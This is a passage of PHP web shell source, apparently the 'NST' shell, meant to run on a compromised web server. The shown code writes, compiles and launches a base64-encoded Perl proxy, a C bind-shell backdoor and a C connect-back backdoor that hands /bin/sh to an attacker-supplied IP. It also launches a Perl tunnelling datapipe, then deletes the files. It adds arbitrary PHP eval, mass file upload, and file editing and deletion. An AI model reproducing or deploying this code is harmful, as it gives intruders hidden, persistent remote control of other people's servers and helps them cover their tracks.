tLQkJCQkJCQkJCS0tDQojLS0JQ3JlYXRlIGEgc29ja2V0IHRoYXQgY29ubmVjdHMgdG8gYSBjZXJ0YWluIGhvc3QJCQktLQ0KIy0tCSRsb2NhbF9ob3N0X2lwIGlzIGFzc3VtZWQgdG8gYmUgbG9jYWwgaG9zdG5hbWUgSVAgYWRkcmVzcwktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBvcGVuX2Nvbm5lY3Rpb24gew0KICAgIGxvY2FsICgkcmVtb3RlX2hvc3RuYW1lLCAkcG9ydCkgPSBAX1sxLDJdOw0KICAgIGxvY2FsICgkc29ja2V0X2Zvcm1hdCwgJHByb3RvLCAkcGFja2VkX3BvcnQsICRjdXIpOw0KICAgIGxvY2FsICgkcmVtb3RlX2FkZHIsIEByZW1vdGVfaXAsICRyZW1vdGVfaXApOw0KICAgIGxvY2FsICgkbG9jYWxfcG9ydCwgJHJlbW90ZV9wb3J0KTsNCiAgICBpZiAoJHBvcnQgIX4gL15cZCskLykgew0KCSRwb3J0ID0gKGdldHNlcnZieW5hbWUoJHBvcnQsICJ0Y3AiKSlbMl07DQoJJHBvcnQgPSA2NjY3IHVubGVzcyAoJHBvcnQpOw0KICAgIH0NCiAgICAkcHJvdG8gPSAoZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKVsyXTsNCiAgICAkcmVtb3RlX2FkZHIgPSAoZ2V0aG9zdGJ5bmFtZSgkcmVtb3RlX2hvc3RuYW1lKSlbNF07DQogICAgaWYgKCEkcmVtb3RlX2FkZHIpIHsNCglkaWUgIlVua25vd24gaG9zdDogJHJlbW90ZV9ob3N0bmFtZSI7DQogICAgfQ0KDQogICAgQHJlbW90ZV9pcCA9IHVucGFjaygiQzQiLCAkcmVtb3RlX2FkZHIpOw0KICAgICRyZW1vdGVfaXAgPSBqb2luKCIuIiwgQHJlbW90ZV9pcCk7DQogICAgcHJpbnQgIkNvbm5lY3RpbmcgdG8gJHJlbW90ZV9pcCBwb3J0ICRwb3J0LlxuXG4iOw0KICAgICRzb2NrZXRfZm9ybWF0ID0gJ1MgbiBhNCB4OCc7DQogICAgJGxvY2FsX3BvcnQgID0gcGFjaygkc29ja2V0X2Zvcm1hdCwgJkFGX0lORVQsIDAsICRsb2NhbF9ob3N0X2lwKTsNCiAgICAkcmVtb3RlX3BvcnQgPSBwYWNrKCRzb2NrZXRfZm9ybWF0LCAmQUZfSU5FVCwgJHBvcnQsICRyZW1vdGVfYWRkcik7DQogICAgc29ja2V0KCRfWzBdLCAmQUZfSU5FVCwgJlNPQ0tfU1RSRUFNLCAkcHJvdG8pIHx8IGRpZSAic29ja2V0OiAkISI7DQogICAgYmluZCgkX1swXSwgJGxvY2FsX3BvcnQpIHx8IGRpZSAiYmluZDogJCEiOw0KICAgIGNvbm5lY3QoJF9bMF0sICRyZW1vdGVfcG9ydCkgfHwgZGllICJzb2NrZXQ6ICQhIjsNCiAgICAkY3VyID0gc2VsZWN0KCRfWzBdKTsgIA0KDQogICAgJHwgPSAxOwkJCQkjIERpc2FibGUgYnVmZmVyaW5nIG9uIHNvY2tldC4NCiAgICBzZWxlY3QoJGN1cik7DQp9DQoNCg==";

if(is_writable("/tmp")){
$fp=fopen("/tmp/nst_perl_proxy.pl","w");
fwrite($fp,base64_decode($perl_proxy_scp));
passthru("nohup perl /tmp/nst_perl_proxy.pl $port &");
unlink("/tmp/nst_perl_proxy.pl");
}else{
if(is_writable(".")){
mkdir(".nst_proxy_tmp");
$fp=fopen(".nst_proxy_tmp/nst_perl_proxy.pl","w");
fwrite($fp,base64_decode($perl_proxy_scp));
passthru("nohup perl .nst_proxy_tmp/nst_perl_proxy.pl $port &");
unlink(".nst_proxy_tmp/nst_perl_proxy.pl");
rmdir(".nst_proxy_tmp");
}
}
$show_ps="1";
}#end of start perl_proxy

if($_POST['c_bd']){
$port=$_POST['port'];
$c_bd_scp = "#define PORT $port
#include <stdio.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
struct sockaddr_in serv_addr;
struct sockaddr_in client_addr;

int main ()
{
    soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (soc_des == -1)
        exit(-1);
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(PORT);
    soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    if (soc_rc != 0)
        exit(-1);
    if (fork() != 0)
        exit(0);
    setpgrp();
    signal(SIGHUP, SIG_IGN);
    if (fork() != 0)
        exit(0);
    soc_rc = listen(soc_des, 5);
    if (soc_rc != 0)
        exit(0);
    while (1) {
        soc_len = sizeof(client_addr);
        soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len);
        if (soc_cli < 0)
            exit(0);
        cli_pid = getpid();
        server_pid = fork();
        if (server_pid != 0) {
            dup2(soc_cli,0);
            dup2(soc_cli,1);
            dup2(soc_cli,2);
            execl(\"/bin/sh\",\"sh\",(char *)0);
            close(soc_cli);
            exit(0);
        }
    close(soc_cli);
    }
}

";


if(is_writable("/tmp")){
$fp=fopen("/tmp/nst_c_bd.c","w");
fwrite($fp,"$c_bd_scp");
passthru("gcc /tmp/nst_c_bd.c -o /tmp/nst_bd");
passthru("nohup /tmp/nst_bd &");
unlink("/tmp/nst_c_bd.c");
unlink("/tmp/nst_bd");
}else{
if(is_writable(".")){
mkdir(".nst_bd_tmp");
$fp=fopen(".nst_bd_tmp/nst_c_bd.c","w");
fwrite($fp,"$c_bd_scp");
passthru("gcc .nst_bd_tmp/nst_c_bd.c -o .nst_bd_tmp/nst_bd");
passthru("nohup .nst_bd_tmp/nst_bd &");
unlink(".nst_bd_tmp/nst_bd");
unlink(".nst_bd_tmp/nst_c_bd.c");
rmdir(".nst_bd_tmp");
}
}
$show_ps="1";
}#end of c bd


if($_POST['bc_c']){ # nc -l -p 4500
$port_c = $_POST['port_c'];
$ip=$_POST['ip'];
$bc_c_scp = "#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>

#include <netinet/in.h>
#include <netdb.h>

int fd, sock;
int port = $port_c;
struct sockaddr_in addr;

char mesg[]  = \"::Connect-Back Backdoor:: CMD: \";
char shell[] = \"/bin/sh\";

int main(int argc, char *argv[]) {
        while(argc<2) {
        fprintf(stderr, \" %s <ip> \", argv[0]);
        exit(0); }

addr.sin_family = AF_INET;
addr.sin_port = htons(port);
addr.sin_addr.s_addr = inet_addr(argv[1]);
fd = socket(AF_INET, SOCK_STREAM, 0);
connect(fd, (struct sockaddr*)&addr, sizeof(addr));

send(fd, mesg, sizeof(mesg), 0);

dup2(fd, 0);
dup2(fd, 1);
dup2(fd, 2);
execl(shell, \"in.telnetd\", 0);

close(fd);
return 1;
}

";

if(is_writable("/tmp")){
if(file_exists("/tmp/nst_c_bc_c.c")){unlink("/tmp/nst_c_bc_c.c");}
if(file_exists("/tmp/nst_c_bc_c.c")){unlink("/tmp/nst_c_bc");}
$fp=fopen("/tmp/nst_c_bc_c.c","w");
$bd_c_scp=str_replace("!n","\n",$bd_c_scp);
fwrite($fp,"$bc_c_scp");
passthru("gcc /tmp/nst_c_bc_c.c -o /tmp/nst_bc_c");
passthru("nohup /tmp/nst_bc_c $ip &");
unlink("/tmp/nst_bc_c");
unlink("/tmp/nst_bc_c.c");
}else{
if(is_writable(".")){
mkdir(".nst_bc_c_tmp");
$fp=fopen(".nst_bc_c_tmp/nst_c_bc_c.c","w");
$bd_c_scp=str_replace("!n","\n",$bd_c_scp);
fwrite($fp,"$bc_c_scp");
passthru("gcc .nst_bc_c_tmp/nst_c_bc_c.c -o .nst_bc_c_tmp/nst_bc_c");
passthru("nohup .nst_bc_c_tmp/nst_bc_c $ip &");
unlink(".nst_bc_c_tmp/nst_bc_c.c");
unlink(".nst_bc_c_tmp/nst_bc_c");
rmdir(".nst_bc_c_tmp");
}
}
$show_ps="1";

}#end of back connect C


if($_POST['datapipe_pl']){
$port_2=$_POST['port_2'];
$port_3=$_POST['port_3'];
$ip=$_POST['ip'];
$datapipe_pl = "
#!/usr/bin/perl
# coded by CuTTer (rus hacker)
use IO::Socket;
use POSIX;

\$localport=$port_2;
\$host=\"$ip\";
\$port=$port_3;

\$daemon=1;

\$DIR = undef;

## Выводить лог событий (1-да, 0-нет)
\$log=0;




\$| = 1;

if (\$daemon){
        print \"3anycKaeM daemon\n\";

        \$pid = fork;
        exit if \$pid;
        die \"Couldn't fork: \$!\" unless defined(\$pid);
        POSIX::setsid() or die \"Can't start a new session: \$!\";
}

%o = ('port' => \$localport,
          'toport' => \$port,
          'tohost' => \$host);

\$ah = IO::Socket::INET->new(
                         'LocalPort' => \$localport,
                         'Reuse' => 1,
                         'Listen' => 10)
    || die \"Нельзя открыть сокет для соединений: \$!\";

print \"Начинаем выполнения цикла.\n\" if \$log;
\$SIG{'CHLD'} = 'IGNORE';
\$num = 0;
while (1) {
        \$ch = \$ah->accept();
        if (!\$ch) {
                print STDERR \"Прервано выполение accept: \$!\n\";
                next;
        }

        printf(\"Новый клиент: host %s, port %s.\n\",
        \$ch->peerhost(), \$ch->peerport()) if \$log;
        ++\$num;
        \$pid = fork();
        if (!defined(\$pid)) {
                print STDERR \"Невозможно выполнить fork: \$!\n\";
    } elsif (\$pid == 0) {
## Новый процесс
                \$ah->close();
                Run(\%o, \$ch, \$num);
        } else {
                print \"Parent: Fork прошел успешно, закрываем сокет.\n\" if \$log;
                \$ch->close();
        }
}


sub Run {
        my(\$o, \$ch, \$num) = @_;
        my \$th = IO::Socket::INET->new('PeerAddr' => \$o->{'tohost'},
                                                        'PeerPort' => \$o->{'toport'});
        print(\"Child: Делаем редирект на \$o->{'tohost'}, порт \$o->{'toport'}.\n\") if \$log;
        if (!\$th) {
                printf STDERR (\"Child: Прерван редирект на %s, порт %s.\n\",
                \$o->{'tohost'}, \$o->{'toport'});
                exit 0;
        }

        my \$fh;
        if (\$o->{'dir'}) {
                \$fh = Symbol::gensym();
                open(\$fh, \">\$o->{'dir'}/tunnel\$num.log\")
                or die \"Child: Прервано создание лог файла \$o->{'dir'}/tunnel\$num.log: \$!\";
        }

        \$ch->autoflush();
        \$th->autoflush();
        while (\$ch || \$th) {
                print \"Child: Включаем цикл.\n\" if \$log;
                my \$rin = \"\";
                vec(\$rin, fileno(\$ch), 1) = 1 if \$ch;
                vec(\$rin, fileno(\$th), 1) = 1 if \$th;
                my(\$rout, \$eout);
                select(\$rout = \$rin, undef, \$eout = \$rin, 120);
                if (!\$rout  &&  !\$eout) {
                        print STDERR \"Child: Ошибка Timeout.\n\";
                }
                my \$cbuffer = \"\";
                my \$tbuffer = \"\";

                if (\$ch && (vec(\$eout, fileno(\$ch), 1) || vec(\$rout, fileno(\$ch), 1))) {
                        print \"Child: Ждем данных от клиента.\n\" if \$log;
                        my \$result = sysread(\$ch, \$tbuffer, 1024);
                        if (!defined(\$result)) {
                                print STDERR \"Child: Ошибка при считывании данных клиента: \$!\n\";
                                exit 0;
                        }
                        if (\$result == 0) {
                                print \"Child: Клиент отсоединился.\n\" if \$log;
                                exit 0;
                        }

                        print \"Child: Данные: \$cbuffer\n\" if \$log;
                }

                if (\$th  &&  (vec(\$eout, fileno(\$th), 1)  || vec(\$rout, fileno(\$th), 1))) {
                        print \"Child: Ждем данных.\n\" if \$log;
                        my \$result = sysread(\$th, \$cbuffer, 1024);
                        if (!defined(\$result)) {
                                print STDERR \"Child: Невозможно считать данные: \$!\n\";
                                exit 0;
                        }

                        if (\$result == 0) {
                                print \"Child: Произошло отсоединение.\n\" if \$log;
                                exit 0;
                        }

                        print \"Child: Данные: \$cbuffer\n\" if \$log;
            }

                if (\$fh  &&  \$tbuffer) {
                        (print \$fh \$tbuffer);
                }

                while (my \$len = length(\$tbuffer)) {
                        print \"Child: Отправляем \$len байт.\n\" if \$log;
                        my \$res = syswrite(\$th, \$tbuffer, \$len);
                        print \"Child: Данные отправлены.\n\" if \$log;
                        if (\$res > 0) {
                                \$tbuffer = substr(\$tbuffer, \$res);
                        } else {
                                print STDERR \"Child: Невозможно отправить данные: \$!\n\";
                        }
                }

                while (my \$len = length(\$cbuffer)) {
                        print \"Child: Отправляем \$len байт клиенту.\n\" if \$log;
                        my \$res = syswrite(\$ch, \$cbuffer, \$len);
                        print \"Child: Данные отправлены..\n\" if \$log;
                        if (\$res > 0) {
                                \$cbuffer = substr(\$cbuffer, \$res);
                        } else {
                                print STDERR \"Child: Невозможно отправить данные: \$!\n\";
                        }
                }
        }
}

";

if(is_writable("/tmp")){
$fp=fopen("/tmp/nst_perl_datapipe.pl","w");
fwrite($fp,"$datapipe_pl");
passthru("nohup perl /tmp/nst_perl_datapipe.pl &");
unlink("/tmp/nst_perl_datapipe.pl");
}else{
if(is_writable(".")){
mkdir(".nst_datapipe_tmp");
$fp=fopen(".nst_datapipe_tmp/nst_perl_datapipe.pl","w");
fwrite($fp,"$datapipe_pl");
passthru("nohup perl .nst_datapipe_tmp/nst_perl_datapipe.pl &");
unlink(".nst_datapipe_tmp/nst_perl_datapipe.pl");
rmdir(".nst_datapipe_tmp");
}
}
$show_ps="1";

}#end of datapipe perl





if($show_ps=="1"){
print "<center><b>[ps ux]</b></center><br><br>";
print "<pre>";
passthru("ps ux");
print "</pre><br><br>";
}



echo "<form method=post><b>md5:</b><br><input name=md5 size=30>
<Br>
md5 online encoder/decoder (brutforce) (php) - [<a href=http://nst.void.ru/?q=releases&download=4>DOWNLOAD</a>]
</form>
";
@$md5=@$_POST['md5'];
if(@$_POST['md5']){ echo "md5:<br><textarea rows=1 cols=113>".md5($md5)."</textarea>";}
echo "<br>
<form method=post><b>base64 e/d:</b><br><input name=base64 size=30></form><br>";
if(@$_POST['base64']){
@$base64=$_POST['base64'];
echo "
<b>Encode: <br><textarea rows=15 cols=113>".base64_encode($base64)."</textarea><br>
Decode:</b> <br><textarea rows=15 cols=113>".base64_decode($base64)."</textarea><br>";}
echo "<br>
<form method=post><b>DES:</b><br><input name=des size=30><br>
John The Ripper [<a href=http://www.openwall.com/john/ target=_blank>Web</a>]</form><br>";
if(@$_POST['des']){
@$des=@$_POST['des'];
echo "<b>Des:</b> <br><textarea rows=15 cols=113>".crypt($des)."</textarea>";}

print "
<b>eval:</b<br>
(example: print \"Hello World\";)
<form method=post>
<font color=red><b>&lt;?</b><br>
<textarea name=eval rows=15 cols=113></textarea><br>
<b>?&gt;</b></font><br>
<input type=submit value=Run style='width:150px;'>
</form><br>
";

function eval_sl($editf){
if(get_magic_quotes_gpc()==1){
$editf=stripslashes($editf);
}
return $editf;
}


if($_POST['eval']){
print "<b>RESULT:<br><br></b>";
eval(eval_sl($_POST['eval']));
print "<br><br>";

print "<font color=green><b>PHP:</b><br>\r\n\r\n";
print "&lt;?\r\n";
print "<br>";
print htmlspecialchars(eval_sl(($_POST['eval'])));
print "<br>";
print "?&gt;\r\n\r\n</font><br><br>";

}

echo $copyr;
exit;}

if(@$_GET['replace']=="1"){
$ip=@$_SERVER['REMOTE_ADDR'];
$d=$_GET['d'];
$e=$_GET['e'];
@$de=$d."/".$e;
$de=str_replace("//","/",$de);
$e=@$e;
echo "[<a href='$php_self?d=$d&del_f=1&wich_f=$e'>Delete</a>] [<a href='$php_self?d=$d&ef=$e&edit=1'>Edit</a>] [<a href='$php_self?d=$d&e=$e&clean=1'>Filesize to 0 byte</a>] [<a href='$php_self?d=$d&e=$e&replace=1'>Replace text in file</a>] [<a href='$php_self?d=$d&download=$e'>Download</a>] [<a href='$php_self?d=$d&rename=1&wich_f=$e'>Rename</a>] [<a href='$php_self?d=$d&chmod=1&wich_f=$e'>CHMOD</a>] [<a href='$php_self?d=$d&ccopy_to=$e'>Copy</a>]<br>";
echo "
Replace tool:<br>
(You can replace any text)<br>
File: $de<br>
<form method=post>
1. Your ip.<br>
2. microsoft.com ip :)<br>
Replace this <input name=thisX size=30 value=$ip> by this <input name=bythis size=30 value=207.46.245.156>
<input type=submit name=doit value=Replace>
</form>
";

if(@$_POST['doit']){
@$thisX=$_POST['thisX'];
@$bythis=$_POST['bythis'];
@$e=$_GET['e'];
$filename="$d/$e";
$fd = @fopen ($filename, "r");
$rpl = @fread ($fd, @filesize ($filename));
$re=str_replace("$thisX","$bythis",$rpl);
$x=@fopen("$d/$e","w");
@fwrite($x,"$re");
echo "<br><center>$thisX Replaced by $bythis<br>
[<a href='$php_self?d=$d&e=$e'>VIew file</a>]<br><br><Br>";

}
echo $copyr;
exit;}


if(@$_GET['t']=="upload"){
echo "<br>
<a href='$php_self?d=$d&t=massupload'>* Mass upload *</a><br>
File upload:<br>
<form enctype=\"multipart/form-data\" method=post>
<input type=file name=text size=50><br>
<input name=where size=52 value='$d'><br>
New file name:<br>
<input name=newf size=30 autocomplete=off> (if empty, it will be default)<br>
<input type=submit value=Upload name=uploadf>
</form><br>
";

if(@$_POST['uploadf']){
$where=$_POST['where'];
$newf=$_POST['newf'];
$where=str_replace("//","/",$where);
if($newf==""){$newf=$_FILES['text']['name'];}else{$newf=$newf;}
$uploadfile = "$where/".$newf;
if (@move_uploaded_file(@$_FILES['text']['tmp_name'], $uploadfile)) {
$uploadfile=str_replace("//","/",$uploadfile);
echo "<i><br>Uploaded to $uploadfile</i><br>";
}else{
echo "<i><br>Error</i><br>";}
}
}

if(@$_GET['t']=="massupload"){
echo "
Mass upload:<br>
<form enctype=\"multipart/form-data\" method=post>
<input type=file name=text1 size=43> <input type=file name=text11 size=43><br>
<input type=file name=text2 size=43> <input type=file name=text12 size=43><br>
<input type=file name=text3 size=43> <input type=file name=text13 size=43><br>
<input type=file name=text4 size=43> <input type=file name=text14 size=43><br>
<input type=file name=text5 size=43> <input type=file name=text15 size=43><br>
<input type=file name=text6 size=43> <input type=file name=text16 size=43><br>
<input type=file name=text7 size=43> <input type=file name=text17 size=43><br>
<input type=file name=text8 size=43> <input type=file name=text18 size=43><br>
<input type=file name=text9 size=43> <input type=file name=text19 size=43><br>
<input type=file name=text10 size=43> <input type=file name=text20 size=43><br>
<input name=where size=43 value='$d'><br>
<input type=submit value=Upload name=massupload>
</form><br>";

if(@$_POST['massupload']){
$where=@$_POST['where'];
$uploadfile1 = "$where/".@$_FILES['text1']['name'];
$uploadfile2 = "$where/".@$_FILES['text2']['name'];
$uploadfile3 = "$where/".@$_FILES['text3']['name'];
$uploadfile4 = "$where/".@$_FILES['text4']['name'];
$uploadfile5 = "$where/".@$_FILES['text5']['name'];
$uploadfile6 = "$where/".@$_FILES['text6']['name'];
$uploadfile7 = "$where/".@$_FILES['text7']['name'];
$uploadfile8 = "$where/".@$_FILES['text8']['name'];
$uploadfile9 = "$where/".@$_FILES['text9']['name'];
$uploadfile10 = "$where/".@$_FILES['text10']['name'];
$uploadfile11 = "$where/".@$_FILES['text11']['name'];
$uploadfile12 = "$where/".@$_FILES['text12']['name'];
$uploadfile13 = "$where/".@$_FILES['text13']['name'];
$uploadfile14 = "$where/".@$_FILES['text14']['name'];
$uploadfile15 = "$where/".@$_FILES['text15']['name'];
$uploadfile16 = "$where/".@$_FILES['text16']['name'];
$uploadfile17 = "$where/".@$_FILES['text17']['name'];
$uploadfile18 = "$where/".@$_FILES['text18']['name'];
$uploadfile19 = "$where/".@$_FILES['text19']['name'];
$uploadfile20 = "$where/".@$_FILES['text20']['name'];
if (@move_uploaded_file(@$_FILES['text1']['tmp_name'], $uploadfile1)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile1</i><br>";}
if (@move_uploaded_file(@$_FILES['text2']['tmp_name'], $uploadfile2)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile2</i><br>";}
if (@move_uploaded_file(@$_FILES['text3']['tmp_name'], $uploadfile3)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile3</i><br>";}
if (@move_uploaded_file(@$_FILES['text4']['tmp_name'], $uploadfile4)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile4</i><br>";}
if (@move_uploaded_file(@$_FILES['text5']['tmp_name'], $uploadfile5)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile5</i><br>";}
if (@move_uploaded_file(@$_FILES['text6']['tmp_name'], $uploadfile6)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile6</i><br>";}
if (@move_uploaded_file(@$_FILES['text7']['tmp_name'], $uploadfile7)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile7</i><br>";}
if (@move_uploaded_file(@$_FILES['text8']['tmp_name'], $uploadfile8)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile8</i><br>";}
if (@move_uploaded_file(@$_FILES['text9']['tmp_name'], $uploadfile9)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile9</i><br>";}
if (@move_uploaded_file(@$_FILES['text10']['tmp_name'], $uploadfile10)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile10</i><br>";}
if (@move_uploaded_file(@$_FILES['text11']['tmp_name'], $uploadfile11)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile11</i><br>";}
if (@move_uploaded_file(@$_FILES['text12']['tmp_name'], $uploadfile12)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile12</i><br>";}
if (@move_uploaded_file(@$_FILES['text13']['tmp_name'], $uploadfile13)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile13</i><br>";}
if (@move_uploaded_file(@$_FILES['text14']['tmp_name'], $uploadfile14)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile14</i><br>";}
if (@move_uploaded_file(@$_FILES['text15']['tmp_name'], $uploadfile15)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile15</i><br>";}
if (@move_uploaded_file(@$_FILES['text16']['tmp_name'], $uploadfile16)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile16</i><br>";}
if (@move_uploaded_file(@$_FILES['text17']['tmp_name'], $uploadfile17)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile17</i><br>";}
if (@move_uploaded_file(@$_FILES['text18']['tmp_name'], $uploadfile18)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile18</i><br>";}
if (@move_uploaded_file(@$_FILES['text19']['tmp_name'], $uploadfile19)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile19</i><br>";}
if (@move_uploaded_file(@$_FILES['text20']['tmp_name'], $uploadfile20)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Uploaded to $uploadfile20</i><br>";}
}
echo $copyr;
exit;}

if(@$_GET['yes']=="yes"){
$d=@$_GET['d']; $e=@$_GET['e'];
unlink($d."/".$e);
$delresult="Success $d/$e deleted <meta http-equiv=\"REFRESH\" content=\"2;URL=$php_self?d=$d\">";
}
if(@$_GET['clean']=="1"){
@$e=$_GET['e'];
$x=fopen("$d/$e","w");
fwrite($x,"");
echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=".@$e."\">";
exit;
}


if(@$_GET['e']){
$d=@$_GET['d'];
$e=@$_GET['e'];
$pinf=pathinfo($e);
if(in_array(".".@$pinf['extension'],$images)){
echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$e&img=1\">";
exit;}
$filename="$d/$e";
$fd = @fopen ($filename, "r");
$c = @fread ($fd, @filesize ($filename));
$c=htmlspecialchars($c);
$de=$d."/".$e;
$de=str_replace("//","/",$de);
if(is_file($de)){
if(!is_writable($de)){echo "<font color=red>READ ONLY</font><br>";}}
echo "[<a href='$php_self?d=$d&del_f=1&wich_f=$e'>Delete</a>] [<a href='$php_self?d=$d&ef=$e&edit=1'>Edit</a>] [<a href='$php_self?d=$d&e=$e&clean=1'>Filesize to 0 byte</a>] [<a href='$php_self?d=$d&e=$e&replace=1'>Replace text in file</a>] [<a href='$php_self?d=$d&download=$e'>Download</a>] [<a href='$php_self?d=$d&rename=1&wich_f=$e'>Rename</a>] [<a href='$php_self?d=$d&chmod=1&wich_f=$e'>CHMOD</a>] [<a href='$php_self?d=$d&ccopy_to=$e'>Copy</a>]<br>";
echo "
File contents:<br>
$de
<br>
<table width=100% border=1 cellpadding=0 cellspacing=0>
<tr><td><pre>
$c

</pre></td></tr>
</table>

";

if(@$_GET['delete']=="1"){
$delete=$_GET['delete'];
echo "
DELETE: Are you sure?<br>
<a href=\"$php_self?d=$d&e=$e&delete=".@$delete."&yes=yes\">Yes</a> || <a href='$php_self?no=1'>No</a>
<br>
";
if(@$_GET['yes']=="yes"){
@$d=$_GET['d']; @$e=$_GET['e'];
echo $delresult;
}
if(@$_GET['no']){
echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$e\">
";
}


} #end of delete
echo $copyr;
exit;
} #end of e

if(@$_GET['edit']=="1"){
@$d=$_GET['d'];
@$ef=$_GET['ef'];
$e=$ef;
if(is_file($d."/".$ef)){
if(!is_writable($d."/".$ef)){echo "<font color=red>READ ONLY</font><br>";}}
echo "[<a href='$php_self?d=$d&del_f=1&wich_f=$e'>Delete</a>] [<a href='$php_self?d=$d&ef=$e&edit=1'>Edit</a>] [<a href='$php_self?d=$d&e=$e&clean=1'>Filesize to 0 byte</a>] [<a href='$php_self?d=$d&e=$e&replace=1'>Replace text in file</a>] [<a href='$php_self?d=$d&download=$e'>Download</a>] [<a href='$php_self?d=$d&rename=1&wich_f=$e'>Rename</a>] [<a href='$php_self?d=$d&chmod=1&wich_f=$e'>CHMOD</a>] [<a href='$php_self?d=$d&ccopy_to=$e'>Copy</a>]<br>";
$filename="$d/$ef";
$fd = @fopen ($filename, "r");
$c = @fread ($fd, @filesize ($filename));
$c=htmlspecialchars($c);
$de=$d."/".$ef;
$de=str_replace("//","/",$de);
echo "
Edit:<br>
$de<br>";

if(!@$_POST['save']){
print "
<form method=post>
<input name=filename value='$d/$ef'>
<textarea cols=143 rows=30 name=editf>$c</textarea>
<br>
<input type=submit name=save value='Save changes'></form><br>
";
}
if(@$_POST['save']){
$editf=@$_POST['editf'];

if(get_magic_quotes_runtime() or get_magic_quotes_gpc()){
$editf=stripslashes($editf);
}

$f=fopen($filename,"w+");
fwrite($f,"$editf");
echo "<br>
<b>File edited.</b>
<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$ef\">";
exit;
}
echo $copyr;
exit;
}



echo"
<table width=100% cellpadding=1 cellspacing=0 class=hack>
<tr><td bgcolor=#519A00><center><b>Filename</b></td><td bgcolor=#519A00><center><b>Tools</b></td><td bgcolor=#519A00><b>Size</b></td><td bgcolor=#519A00><center><b>Owner/Group</b></td><td bgcolor=#519A00><b>Perms</b></td></tr>
";
$dirs=array();
$files=array();
$dh = @opendir($d) or die("<table width=100%><tr><td><center>Permission Denied or Folder/Disk does not exist</center><br>$copyr</td></tr></table>");
while (!(($file = readdir($dh)) === false)) {
if ($file=="." || $file=="..") continue;
if (@is_dir("$d/$file")) {
      $dirs[]=$file;
}else{
      $files[]=$file;
      }
   sort($dirs);
   sort($files);

$fz=@filesize("$d/$file");
}

function perm($perms){
if (($perms & 0xC000) == 0xC000) {
   $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
   $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
   $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
   $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
   $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
   $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
   $info = 'p';
} else {
   $info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
           (($perms & 0x0800) ? 's' : 'x' ) :
           (($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
           (($perms & 0x0400) ? 's' : 'x' ) :
           (($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
           (($perms & 0x0200) ? 't' : 'x' ) :
           (($perms & 0x0200) ? 'T' : '-'));
return $info;
}


for($i=0; $i<count($dirs); $i++){

$perms = @fileperms($d."/".$dirs[$i]);
$owner = @fileowner($d."/".$dirs[$i]);
if($os=="unix"){
$fileownera=posix_getpwuid($owner);
$owner=$fileownera['name'];
}
$group = @filegroup($d."/".$dirs[$i]);
if($os=="unix"){
$groupinfo = posix_getgrgid($group);
$group=$groupinfo['name'];
}
$info=perm($perms);
if($i%2){$color="#D7FFA8";}else{$color="#D1D1D1";}
$linkd="<a href='$php_self?d=$d/$dirs[$i]'>$dirs[$i]</a>";
$linkd=str_replace("//","/",$linkd);
echo "<tr><td bgcolor=$color><font face=wingdings size=2>0</font> $linkd</td><td bgcolor=$color><center><font color=blue>DIR</font></td><td bgcolor=$color>&nbsp;</td><td bgcolor=$color><center>$owner/$group</td><td bgcolor=$color>$info</td></tr>";
